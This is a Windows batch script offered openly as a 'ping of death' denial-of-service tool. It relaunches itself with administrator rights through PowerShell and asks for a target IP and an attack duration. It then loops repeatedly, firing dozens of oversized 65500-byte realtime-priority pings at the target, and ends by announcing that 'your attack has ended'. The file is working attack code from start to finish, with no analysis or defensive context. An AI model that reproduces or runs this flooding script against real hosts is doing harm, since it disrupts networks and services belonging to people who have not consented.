@echo off

for /f "tokens=3 delims=\ " %%i in ('whoami /groups^|find "Mandatory"') do set LEVEL=%%i
if NOT "%LEVEL%"=="High" (
powershell.exe -NoProfile -ExecutionPolicy RemoteSigned -Command "Start-Process %~f0 -Verb runas"
exit
)

set /p IP=Target's Ip here : 
set /p timemin=Enter attack duration (minutes:2~) : 
set minutes=%time:~3,2%
set /a duration_minutes=%minutes%+%timemin%
:restart_ping_of_death
if "%duration_minutes%" neq "%minutes%" (
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
   start /b /REALTIME ping %IP% -l 65500 -w -1 -n 1 >nul 2>&1
set minutes=%time:~3,2%
goto restart_ping_of_death
) else (
echo [%time%] [+] Your attack has ended..
timeout /t 2 /nobreak >nul
pause
exit
)
